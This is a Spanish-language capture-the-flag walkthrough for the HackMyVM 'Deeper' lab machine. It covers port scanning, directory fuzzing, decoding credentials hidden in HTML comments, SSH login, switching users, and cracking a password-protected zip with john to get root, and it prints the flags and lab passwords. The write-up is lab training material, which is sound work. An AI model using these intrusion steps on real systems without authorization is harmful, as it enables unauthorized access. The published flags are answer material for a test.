---
icon: flag
---

# Deeper HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 06:02 EDT
Nmap scan report for 192.168.5.95
Host is up (0.0020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 37:d1:6f:b5:a4:96:e8:78:18:c7:77:d0:3e:20:4e:55 (ECDSA)
|_  256 cf:5d:90:f3:37:3f:a4:e2:ba:d5:d7:25:c6:4a:a0:61 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Deeper
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:A7:74:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
```

Veremos un puerto `80` en el que suele alojar una pagina web, si entramos dentro de dicho puerto veremos una pagina aparentemente normal, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.95/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 666]
/img                  (Status: 200) [Size: 1333]
Progress: 79198 / 882244 (8.98%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 79994 / 882244 (9.07%)
===============================================================
Finished
===============================================================
```

Veremos cosas pero nada interesante,, si inspeccionamos el codigo de la pagina principal veremos lo siguiente interesante:

```html
<!-- GO "deeper" -->
```

Nos da una pista de que puede ser un recurso `web` la palabra `deeper`.

```
URL = http://<IP>/deeper
```

Vemos que nos lleva a otra pagina con otra imagen, si volvemos a inspeccionar el codigo veremos lo siguiente:

```html
<!-- GO evendeeper -->
```

Vemos que nos pone otra palabra, por lo que vamos a probar acceder a dicho recurso si existiera desde donde estamos.

```
URL = http://<IP>/deeper/evendeeper
```

Veremos que tambien carga y si volvemos a inspeccionar le codigo veremos este codigo en `morse` que hay a la derecha del todo, tambien abajo del todo veremos una contraseña cifrada.

```html
<!-- USER .- .-.. .. -.-. . -->
<!-- PASS 53586470624778486230526c5a58426c63673d3d -->
```

Si decodificamos el `USER` veremos lo siguiente:

```
ALICE
```

Veremos que nos da un usuario llamado `alice`, ahora probemos con la contraseña.

Veremos que es un codigo `Hexadecimal` traducido a `ascii` veremos lo siguiente:

```shell
SXdpbGxHb0RlZXBlcg==
```

Ahora vemos que es un codigo en `base64` por lo qie haremos esto en una terminal.

```shell
echo 'SXdpbGxHb0RlZXBlcg==' | base64 -d
```

Info:

```
IwillGoDeeper
```

Por lo que vemos puede ser la contraseña del usuario `alice` por lo que vamos a probar a conectarnos por `SSH` a ver si funciona.

### SSH

```shell
ssh alice@<IP>
```

Metemos como contraseña `IwillGoDeeper`...

```
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
alice@deeper:~$ whoami
alice
```

Y veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
7e267b737cc121c29b496dc3bcffa5a7
```

## Escalate user bob

Si listamos la `home` del usuario `alice` veremos un archivo llamado `.bob.txt` que pone lo siguiente:

```
535746745247566c634556756233566e61413d3d
```

Vemos que esta codificado en `Hexadecimal`, por lo que vamos a decodificarlo:

```
SWFtRGVlcEVub3VnaA==
```

Ahora esta en `Base64`, si lo decodificamos de esta forma:

```shell
echo 'SWFtRGVlcEVub3VnaA==' | base64 -d
```

Info:

```
IamDeepEnough
```

Veremos que puede ser la contraseña del usuario `bob` vamos a probarla asi:

```shell
su bob
```

Metemos como contraseña `IamDeepEnough`...

```
bob@deeper:/home/alice$ whoami
bob
```

Veremos que ha funcionado y seremos dicho usuario.

## Escalate Privileges

Si listamos la `home` del usuario `bob` veremos que hay un archivo `zip` interesante el cual nos vamos a pasar a nuestro `host` (`KALI`).

Como no tenemos `python3` vamos a utilizar la utilidad de `SCP` por `SSH`, por lo que vamos a iniciar el servicio `SSH` desde nuestro `host`.

```shell
sudo systemctl start ssh
```

Ahora desde la maquina victima haremos esto:

```shell
scp root.zip kali@<IP>:/home/kali/Desktop/deeper/
```

Con esto tendremos el archivo en nuestro `host`.

Si intentamos decomprimirlo veremos que esta con contraseña, por lo que vamos a `crackearlo` con `john` de esta forma:

```shell
zip2john root.zip > hash.txt
john --wordlist=<WORDLIST> hash.txt
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bob              (root.zip/root.txt)     
1g 0:00:00:00 DONE (2025-09-08 06:59) 14.28g/s 351085p/s 351085c/s 351085C/s havana..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que lo ha decodificado y la contraseña es `bob`, vamos a descomprimirlo.

```shell
unzip root.zip
```

Metemos como contraseña `bob` y veremos lo siguiente:

```
Archive:  root.zip
[root.zip] root.txt password: 
 extracting: root.txt
```

Si leemos dicho `root.txt` veremos lo siguiente:

```
root:IhateMyPassword
```

Vamos a probar esa contraseña con el usuario `root`.

```shell
su root
```

Metemos como contraseña `IhateMyPassword`...

```
root@deeper:/home/bob# whoami
root
```

Y con esto veremos que seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
dbc56c8328ee4d00bbdb658a8fc3e895
```
